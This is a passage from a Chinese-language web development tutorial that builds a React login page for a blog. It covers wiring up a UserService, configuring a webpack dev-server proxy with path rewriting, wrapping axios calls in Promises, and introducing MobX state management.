<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"email"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"password"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"#"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
问题：
</p>
<ul class="org-ul">
<li>页面提交
<ol class="org-ol">
<li>这次发现有一些问题，按钮点击会提交，导致页面刷新了。要阻止页面刷新，其实就是阻止提交。使用event.preventDefault()。</li>
</ol></li>
<li>如何拿到邮箱和密码？
<ol class="org-ol">
<li>event.target.form返回暗流所在表单，可以看做一个数组。</li>
<li>fm[0].value和fm[1].value就是文本框的值。</li>
</ol></li>
<li>如何在Login组件中使用UserService实例呢？
<ol class="org-ol">
<li>使用全局变量，虽然可以，但不好。</li>
<li>可以在Login的构造器中通过属性注入。</li>
<li>也可以在外部使用props注入。使用这种方式。</li>
</ol></li>
</ul>

<p>
修改，保证在login组件中使用UserService，使用属性注入
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#20462;&#25913;src/component/login.js&#25991;&#20214;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'../css/login.css'</span>;
<span style="color: #a020f0;">import</span> UserService from <span style="color: #8b2252;">'../service/user'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">service</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component {
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">_Login</span> <span style="color: #a0522d;">service</span>={service} /&gt;
  }
}

<span style="color: #a020f0;">class</span> _Login <span style="color: #a020f0;">extends</span> React.Component {
  handleClick(event) {
    event.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#20107;&#20214;&#40664;&#35748;&#34892;&#20026;, &#38459;&#27490;&#25552;&#20132; Ajax</span>
    console.log(<span style="color: #8b2252;">'click'</span>);
    <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36830;&#25509;&#21040;&#26381;&#21153;&#22120;&#31471;&#36827;&#34892;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#30340;&#39564;&#35777;&#31561;&#24453;&#22238;&#22797;</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">&#32452;&#20214;&#20013;&#21482;&#35201;&#25910;&#38598;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;&#23601;&#21487;&#20197;&#20102;&#65292;&#39564;&#35777;&#20132;&#32473;&#20854;&#20182;&#30340;&#26381;&#21153;&#23618;Service&#23618;</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">service.login() // service&#26159;&#20840;&#23616;&#21464;&#37327;&#65292;&#23545;&#20110;&#32452;&#20214;&#29992;props</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">this.props.service.login();</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log('=====',event.target)</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log('=====',event.target.form)</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">let form = event.target.form;</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(form[0], form[1]); // key</span>
    <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(form[0].value, form[1].value); // value</span>
    <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>] = event.target.form;
    <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(username.value, password.value);</span>
    <span style="color: #008b8b;">this</span>.props.service.login(username.value, password.value);
  }
  render() {
    <span style="color: #a020f0;">return</span> (
      &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;? </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#28165;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
    );
  }
}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:ac22f960-259b-472e-8eca-566447347475" class="outline-4">
<h4 id="h:ac22f960-259b-472e-8eca-566447347475">UserService的login方法实现</h4>
<div class="outline-text-4" id="text-h:ac22f960-259b-472e-8eca-566447347475">
</div>
<div id="outline-container-h:f067e4c5-3219-498c-9582-4e7f875b48e9" class="outline-5">
<h5 id="h:f067e4c5-3219-498c-9582-4e7f875b48e9">代理配置</h5>
<div class="outline-text-5" id="text-h:f067e4c5-3219-498c-9582-4e7f875b48e9">
<ul class="org-ul">
<li>修改webpack.config.dev.jsw文件中proxy部分，保证proxy的target是后台服务的地址和端口，且要开启后台服务。</li>
<li>注意：修改这个配置，需要重启dev server</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#20462;&#25913;webpack.config.dev.js&#25991;&#20214;</span><span style="color: #b22222;"> */</span>
devServer: {
    compress: <span style="color: #008b8b;">true</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">gzip</span><span style="color: #b22222;"> */</span>
    <span style="color: #b22222;">//</span><span style="color: #b22222;">host:'192.168.61.109', /* &#35774;&#32622;ip */</span>
    port: 3000,
    publicPath: <span style="color: #8b2252;">'/assets/'</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#35774;&#32622;bundled files&#27983;&#35272;&#22120;&#31471;&#35775;&#38382;&#22320;&#22336;</span><span style="color: #b22222;"> */</span>
    hot: <span style="color: #008b8b;">true</span>,  <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#24320;&#21551;HMR&#28909;&#27169;&#22359;&#26367;&#25442;</span><span style="color: #b22222;"> */</span>
    inline: <span style="color: #008b8b;">true</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#25511;&#21046;&#27983;&#35272;&#22120;&#25511;&#21046;&#21488;&#26159;&#21542;&#26174;&#31034;&#20449;&#24687;</span><span style="color: #b22222;"> */</span>
    historyApiFallback: <span style="color: #008b8b;">true</span>,
    stats: {
        chunks: <span style="color: #008b8b;">false</span>
    },
    proxy: { <span style="color: #b22222;">//</span><span style="color: #b22222;">&#20195;&#29702;</span>
        <span style="color: #8b2252;">'/api'</span>: {
            target: <span style="color: #8b2252;">'http://127.0.0.1:8000'</span>,
            changeOrigin: <span style="color: #008b8b;">true</span>
        }
    }
}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7738b313-b74a-4eed-b7dd-5ff41a1c8bca" class="outline-5">
<h5 id="h:7738b313-b74a-4eed-b7dd-5ff41a1c8bca">axios异步库</h5>
<div class="outline-text-5" id="text-h:7738b313-b74a-4eed-b7dd-5ff41a1c8bca">
<ul class="org-ul">
<li>axios是一个基于Promise的HTTP异步库，可以用在浏览器或nodejs中。</li>
<li>使用axios发起异步调用，完成POST、GET方法的数据提交。可以查照官网的例子。</li>
<li>中文说明<a href="https://www.kancloud.cn/yunye/axios/234845">https://www.kancloud.cn/yunye/axios/234845</a></li>
</ul>

<p>
<b>安装npm</b>
</p>
<div class="org-src-container">
<pre class="src src-sh">yarn add axios  <span style="color: #b22222;">#</span><span style="color: #b22222;">npm install axios </span>
</pre>
</div>

<p>
注意：如果使用yarn安装，就不要再使用npm安装包了，以免出现问题。
</p>

<p>
<b>导入</b>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">'axios'</span>;
</pre>
</div>

<p>
修改service/user.js如下
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">'axios'</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> UserService {
    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO application/json</span>
        axios.post(<span style="color: #8b2252;">'/api/users/login'</span>, {
            username, password
        })
            .then(<span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">response</span>) {
                console.log(response, <span style="color: #8b2252;">'++++'</span>);
                console.log(response.status);
                console.log(response.data);
            }, <span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">error</span>) {
                console.log(error, <span style="color: #8b2252;">'&#20854;&#20182;&#38169;&#35823;----'</span>);
            });
        console.log(<span style="color: #8b2252;">'&#22788;&#29702;&#23436;&#20102;&#65311;'</span>);
    }
}
</pre>
</div>

<p>
测试时，加上默认用户和密码
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">component/login.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
<span style="color: #a020f0;">import</span> UserService from <span style="color: #8b2252;">'../service/user'</span>;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">service</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component{
    render() {
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">_Login</span> <span style="color: #a0522d;">service</span>={service}/&gt;
    }
}

<span style="color: #a020f0;">class</span> _Login <span style="color: #a020f0;">extends</span> React.Component{
    handleClick(event) {
        event.preventDefault();
        console.log(<span style="color: #8b2252;">'click'</span>)
        <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>] = event.target.form;
        <span style="color: #008b8b;">this</span>.props.service.login(username.value, password.value);
    }
    render() {
        <span style="color: #a020f0;">return</span>(
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
问题：
</p>
<ol class="org-ol">
<li><p>
404
</p>

<p>
填入用户名，密码，点击登录，返回404，查看发现访问的地址是 <a href="http://127.0.0.1:3000/api/users/login">http://127.0.0.1:3000/api/users/login</a>, 也就是多了/api。
</p></li>

<li>解决：

<ol class="org-ol">
<li><p>
修改blog
</p>

<p>
server的代码的路由匹配规则(不建议这么做，影响比较大)
</p></li>

<li><p>
<b>rewrite</b>,类似httpd,nginx等的rewrite功能。本次测试使用的是dev
</p>

<p>
server，去官方看看。<a href="https://webpack.js.org/configuration/dev-server/#devserver-proxy">https://webpack.js.org/configuration/dev-server/#devserver-proxy</a>可以看到pathRewrite可以完成路由重写。
</p></li>
</ol></li>
</ol>

<p>
修改webpack.config.dev.js文件
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#20462;&#25913;webpack.config.dev.js&#25991;&#20214;&#20013;&#23545;&#24212;&#20869;&#23481;</span><span style="color: #b22222;">*/</span>
devServer: {
    compress: <span style="color: #008b8b;">true</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">gzip</span><span style="color: #b22222;"> */</span>
    <span style="color: #b22222;">//</span><span style="color: #b22222;">host:'192.168.61.109', /* &#35774;&#32622;ip */</span>
    port: 3000,
    publicPath: <span style="color: #8b2252;">'/assets/'</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#35774;&#32622;bundled files&#27983;&#35272;&#22120;&#31471;&#35775;&#38382;&#22320;&#22336;</span><span style="color: #b22222;"> */</span>
    hot: <span style="color: #008b8b;">true</span>,  <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#24320;&#21551;HMR&#28909;&#27169;&#22359;&#26367;&#25442;</span><span style="color: #b22222;"> */</span>
    inline: <span style="color: #008b8b;">true</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#25511;&#21046;&#27983;&#35272;&#22120;&#25511;&#21046;&#21488;&#26159;&#21542;&#26174;&#31034;&#20449;&#24687;</span><span style="color: #b22222;"> */</span>
    historyApiFallback: <span style="color: #008b8b;">true</span>,
    stats: {
        chunks: <span style="color: #008b8b;">false</span>
    },
    proxy: { <span style="color: #b22222;">//</span><span style="color: #b22222;">&#20195;&#29702;</span>
        <span style="color: #8b2252;">'/api'</span>: {
            target: <span style="color: #8b2252;">'http://127.0.0.1:8000'</span>,
            pathRewrite: {<span style="color: #8b2252;">"^/api"</span> : <span style="color: #8b2252;">""</span>}, <span style="color: #b22222;">//</span><span style="color: #b22222;">&#23558;&#25152;&#26377;&#20195;&#29702;&#20146;&#25114;&#20013;&#24050;/api&#24320;&#22836;&#30340;&#35831;&#27714;&#20013;&#23545;&#24212;&#23383;&#31526;&#26367;&#25442;&#25104;&#31354;</span>
            changeOrigin: <span style="color: #008b8b;">true</span>
        }
    }
}
</pre>
</div>


<p>
重启dev
</p>
<ul class="org-ul">
<li>server.使用正确用户，密码登录，返回了json数据，在response.data中可以看到token、user。</li>
</ul>


<p>
为方便起见，为所有支持的请求方法提供了别名
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">axios.request</span>(config)
  -&gt; Post axios.request({method:<span style="color: #8b2252;">'post'</span>, user:<span style="color: #8b2252;">''</span>, data:{}})
  -&gt; GET axios.request({method:<span style="color: #8b2252;">'get'</span>, url:<span style="color: #8b2252;">''</span>})

<span style="color: #0000ff;">axios.get</span>(url[, config])
  -&gt; axios.get(url)
  -&gt; axios.get(url, {baseURL:<span style="color: #8b2252;">'/api'</span>})

<span style="color: #0000ff;">axios.delete</span>(url[, config])
<span style="color: #0000ff;">axios.head</span>(url[, config])

<span style="color: #0000ff;">axios.post</span>(url[, data[, config]])
  -&gt; axios.post(url)
  -&gt; axios.post(url, {name:<span style="color: #8b2252;">'tom'</span>}, {baseURL:<span style="color: #8b2252;">'/api'</span>})

<span style="color: #0000ff;">axios.put</span>(url[, data[, config]])
<span style="color: #0000ff;">axios.patch</span>(url[, data[, config]])
</pre>
</div>

<p>
如
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/user.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">'axios'</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> UserService {
    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO application/json</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">axios.post axios.get proxy:/api/users/login -&gt; rewrite http://localhost:8000/users/login</span>
        <span style="color: #b22222;">// </span>
        axios.post(<span style="color: #8b2252;">'/users/login'</span>, {
            username, password
        }, {
            baseURL: <span style="color: #8b2252;">'/api'</span>,
            timeout:3000,
        })
            .then(<span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">response</span>) {
                console.log(response, <span style="color: #8b2252;">'++++'</span>);
                console.log(response.status);
                console.log(response.data);
                console.log(response.data.code); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25104;&#21151;&#36820;&#22238;undefined&#65292;&#22833;&#36133; code:1</span>
                <span style="color: #a020f0;">if</span> (!response.data.code) {
                    console.log(<span style="color: #8b2252;">'success'</span>);
                }<span style="color: #a020f0;">else</span> {
                    console.log(<span style="color: #8b2252;">'failed'</span>)
                }
            }, <span style="color: #a020f0;">function</span> (<span style="color: #a0522d;">error</span>) {
                console.log(error, <span style="color: #8b2252;">'&#20854;&#20182;&#38169;&#35823;----'</span>);
            });
        console.log(<span style="color: #8b2252;">'&#22788;&#29702;&#23436;&#20102;&#65311;'</span>);
    }
}
</pre>
</div>

<p>
对象合并方法
</p>
<ul class="org-ul">
<li>方法1：使用解析</li>
<li>方法2：Object.assign(target, …sources)</li>
</ul>

<p>
示例
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">var</span> <span style="color: #a0522d;">o1</span> = {a: 1}
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">o2</span> = {e: 200, a: 100}
<span style="color: #a020f0;">let</span> <span style="color: #a0522d;">o3</span> = Object.assign({}, o1, o2);
console.log(o3); <span style="color: #b22222;">// </span><span style="color: #b22222;">{ a: 100, e: 200 }</span>

<span style="color: #a020f0;">let</span> <span style="color: #a0522d;">o4</span> = {...o1, ...o2}
console.log(o4); <span style="color: #b22222;">// </span><span style="color: #b22222;">{ a: 100, e: 200 }</span>

<span style="color: #a020f0;">let</span> <span style="color: #a0522d;">o4</span> = {...o1, ...o2.obj}  <span style="color: #b22222;">// </span><span style="color: #b22222;">o2.obj&#19981;&#23384;&#22312;&#65292;&#20063;&#21487;&#20197;&#21512;&#24182;</span>
console.log(o4); <span style="color: #b22222;">// </span><span style="color: #b22222;">{ a: 1 }</span>
</pre>
</div>

<p>
<b>axios处理</b>
</p>

<p>
src/axios/index.js构建一个类Axios。使用静态方法、Promise封闭ajax请求的处理
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/axios/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">'axios'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">axios.post axios.get proxy:/api/users/login -&gt; rewrite http://localhost:8000/users/login</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">baseURL:/api</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Axios {
    <span style="color: #a020f0;">static</span> config = {
        baseURL: <span style="color: #8b2252;">'/api'</span>,
        timeout:3000,
    }
    <span style="color: #a020f0;">static</span> post(params) {
        <span style="color: #a020f0;">return</span> axios.post(
            params.url, 
            params.data, 
            {...<span style="color: #008b8b;">this</span>.config, ...params.config}
        ).then( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36820;&#22238;&#19968;&#20010;&#20840;&#26032;&#30340;Promise&#23545;&#35937;</span>
            response =&gt; { <span style="color: #b22222;">// </span><span style="color: #b22222;">200. &#19968;&#23450;&#35201;&#29992;&#31661;&#22836;&#20989;&#25968;&#65292;&#21542;&#21017;this&#26377;&#38382;&#39064;</span>
                <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">data</span> = response.data; 
                <span style="color: #a020f0;">if</span> (!data.code) {
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">sucess</span>
                    <span style="color: #a020f0;">return</span> data;  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#30456;&#24403;&#20110; return Promise.resolve(data);</span>
                }<span style="color: #a020f0;">else</span>{
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">failed</span>
                    <span style="color: #a020f0;">return</span> Promise.reject(data); <span style="color: #b22222;">// </span><span style="color: #b22222;">{code:1, msg:xxx}</span>
                }
            }
        ).<span style="color: #a020f0;">catch</span>( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22833;&#36133;&#32473;&#20986;&#22833;&#36133;&#30340;&#29702;&#30001;</span>
            reason =&gt; {
                <span style="color: #a020f0;">return</span> Promise.reject(reason); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#33258;&#24049;&#35843;&#29992;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">return Promise.reject('&#35831;&#27714;&#38169;&#35823;');</span>
            }
        )
    }
}
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/user.js</span><span style="color: #b22222;">*/</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> UserService {
    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password}
        }).then(
            value =&gt; {
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#25104;&#21151;&#24590;&#20040;&#21150;</span>
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>)
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
            }
        );
    }
}
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:a34ba445-8806-4a4e-9d89-336c702220f3" class="outline-4">
<h4 id="h:a34ba445-8806-4a4e-9d89-336c702220f3">Mobx状态管理</h4>
<div class="outline-text-4" id="text-h:a34ba445-8806-4a4e-9d89-336c702220f3">
</div>
<div id="outline-container-h:89ce8980-41be-49e7-816d-a33298180446" class="outline-5">
<h5 id="h:89ce8980-41be-49e7-816d-a33298180446">Redux和Mobx</h5>
<div class="outline-text-5" id="text-h:89ce8980-41be-49e7-816d-a33298180446">
<p>
社区提供的状态管理库，有Redux和Mobx。
</p>

<p>
Redux代码优秀，使用严格的函数式编程思想，学习曲线陡峭，小项目使用的优劣不明显。
</p>

<p>
Mobx，非常优秀稳定的库，简单方便，适合中小项目使用。使用面向对象的方式，容易学习和接受。现在在中小项目中使用也非常广泛。Mobx和React也是一对强力组合。
</p>
<ul class="org-ul">
<li>Mobx官网<a href="https://mobx.js.org/">https://mobx.js.org/</a></li>
<li>Mobx中文网<a href="https://cn.mobx.js.org/">https://cn.mobx.js.org/</a></li>
<li>Mobx是由Mendix、Coinbase、Facebook开源，它实现了观察者模式。</li>
</ul>

<p>
观察者模式
</p>
<ul class="org-ul">
<li>观察者模式，也称为发布订阅模式。观察者观察某个目标，目标对象(Obserable)状态发生了变化，会通知自己内部注册了的观察者Observer。</li>
</ul>
</div>
</div>
<div id="outline-container-h:95939178-68f4-4a43-bb0d-ffbc8e2c921f" class="outline-5">
<h5 id="h:95939178-68f4-4a43-bb0d-ffbc8e2c921f">状态管理</h5>
<div class="outline-text-5" id="text-h:95939178-68f4-4a43-bb0d-ffbc8e2c921f">
<p>
需求：
</p>
<ul class="org-ul">
<li>一个组件的onClick触发事件响应函数，此函数会调用后台服务。但是后台服务比较耗时，等处理完，需要引起组件的渲染操作。</li>
<li>要组件渲染，就需要改变组件的props或state。</li>
</ul>

<p>
同步调用
</p>
<ul class="org-ul">
<li>同步调用中，实际上就是等着耗时的函数返回</li>
</ul>

<p>
异步调用
</p>
<ul class="org-ul">
<li>思路一,使用setTimeout问题
<ol class="org-ol">
<li>无法向内部的等待执行函数传入参数，比如Root实例。</li>
<li>延时执行的函数的返回值无法取到，所以无法通知Root</li>
</ol></li>
<li>思路二、Promise异步执行
<ol class="org-ol">
<li>Promise异步执行，如果成功，将调用回调。</li>
<li><b>不管render中是否显示state的值，只要state改变，都会触发render执行</b></li>
</ol></li>
</ul>

<p>
<b>同步调用</b>
</p>

<p>
模拟阻塞
</p>
<div class="org-src-container">
<pre class="src src-js">console.log(<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>())
console.log(<span style="color: #a020f0;">new</span> <span style="color: #228b22;">Date</span>().getTime())

